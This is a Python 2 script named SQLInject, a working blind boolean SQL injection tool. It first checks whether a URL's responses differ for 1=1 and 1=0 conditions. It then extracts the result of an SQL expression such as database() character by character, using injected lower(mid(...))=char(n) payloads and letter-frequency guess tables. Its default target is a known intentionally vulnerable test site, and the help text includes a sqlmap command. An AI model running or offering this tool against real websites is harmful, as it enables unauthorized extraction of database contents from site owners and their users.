#SQLInject
# Written by Pierre GOude
import md5, sys, urllib2, sys
import pdb
def lettertable(letter):
   return {
           "q":"uaqoisvretwybnhlxmfpzcdjgk_1234567890.,",
           "w":"ahieonsrldwyfktubmpcgzvjqx_1234567890.,",
           "e":"rndsaletcmvyipfxwgoubqhkzj_1234567890.,",
           "r":"eoiastydnmrugkclvpfbhwqzjx_1234567890.,",
           "t":"hoeiartsuylwmcnfpzbgdjkxvq_1234567890.,",
           "y":"oesitamrlnpbwdchfgukzvxjyq_1234567890.,",
           "u":"trsnlgpceimadbfoxkvyzwhjuq_1234567890.,",
           "i":"ntscolmedrgvfabpkzxuijqhwy_1234567890.,",
           "o":"nurfmtwolspvdkcibaeygjhxzq_1234567890.,",
           "p":"eroaliputhsygmwbfdknczjvqx_1234567890.,",
           "l":"eliayodusftkvmpwrcbgnhzqxj_1234567890.,",
           "k":"einslayowfumrhtkbgdcvpjzqx_1234567890.,",
           "j":"euoainkdlfsvztgprhycmjxwbq_1234567890.,",
           "h":"eaioturysnmlbfwdchkvqpgzjx_1234567890.,",
           "g":"ehroaiulsngtymdwbfpzkxcvjq_1234567890.,",
           "f":"oeriafutlysdngmwcphjkbzvqx_1234567890.,",
           "d":"eioasruydlgnvmwfhjtcbkpqzx_1234567890.,",
           "s":"tehiosaupclmkwynfbqdgrvjzx_1234567890.,",
           "a":"ntrsldicymvgbpkuwfehzaxjoq_1234567890.,",
           "z":"eiaozulywhmtvbrsgkcnpdjfqx_1234567890.,",
           "x":"ptcieaxhvouqlyfwbmsdgnzrkj_1234567890.,",
           "c":"oheatikrlucysqdfnzpmgxbwvj_1234567890.,",
           "v":"eiaoyrunlsvdptjgkhcmbfwzxq_1234567890.,",
           "b":"euloyaristbjmdvnhwckgpfzxq_1234567890.,",
           "m":"tashwiobmcfdplnergyuvkjqzx_1234567890.,",
           "n":"tashwiobmcfdplnergyuvkjqzx_1234567890.,",
           "1":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "2":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "3":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "4":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "5":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "6":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "7":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "8":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "9":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "0":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           ".":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           ",":"1234567890.,-tashwiobmcfdplnergyuvkjqzx_",
           "_":"tashwiobmcfdplnergyuvkjqzx_1234567890.,-",
    }[letter]
def md5sum(value):
    hasher = md5.new()
    hasher.update(value)
    return hasher.hexdigest()
def fetch_page(url):
    request = urllib2.Request(url)
    requestor = urllib2.build_opener()
    request.addheaders = [('User-agent', 'Mozilla/5.0')]
    content = requestor.open(request).read()
    return content
def hsbrute(targeturl): 
    #pdb.set_trace()
    urlstart, sqlquery, urlend = targeturl.split("^")
    truehash = md5sum(fetch_page(urlstart + "/**/and/**/1=1/**/"+urlend))
    falsehash = md5sum(fetch_page(urlstart + "/**/and/**/1=0/**/"+urlend))
    if falsehash==truehash:
	print "Not Injectable.  Check this URL with a browser (and try 1=0)."+urlstart + "/**/and/**/1=1/**/"+urlend
        sys.exit(1)
    global attemptcounter
    ret_str = []
    last_ltr = ""
    element_found=0
    i=-1
    while not element_found:
      i += 1
      b_arr = "tashwiobmcfdplnergyuvkjqzx_1234567890"
      if last_ltr :
        b_arr=lettertable(last_ltr)
      for j in range(len(b_arr)):
	brute = b_arr[j]
        querystring = urlstart+"/**/and/**/lower(mid("+sqlquery+","+str(i+1)+",1))=char("+ str(ord(brute)) +")/**/"+urlend
	attemptcounter += 1
#	print querystring
	if md5sum(fetch_page(querystring))==truehash:
#	   print "is true"
           ret_str.append(b_arr[j])
           print "".join(ret_str[:])
           last_ltr=b_arr[j]
           break
# 	print "is false"
        if j == len(b_arr)-1 :
           print "end of word found"
	   element_found=1
    return ret_str
def printhelp():
  print """Here is your help.
python sqlinjector.py  http://www.urltotarget.com/sqlinjectable.php?vulnerable=target^sql statement here^restoftheURL=value
Example -t targetdomain.com -c "./sqlmap -u {url} --cookie: {cookies}"
"""
if "-h" in sys.argv:
  printhelp()
  sys.exit(2)
target="http://testphp.vulnweb.com/listproducts.php?cat=1^database()^#"
if sys.argv[1]:
 target = sys.argv[1]
current=0
attemptcounter=0
print "Found target " + "".join(hsbrute(target)) + " in " + str(attemptcounter) + " guesses."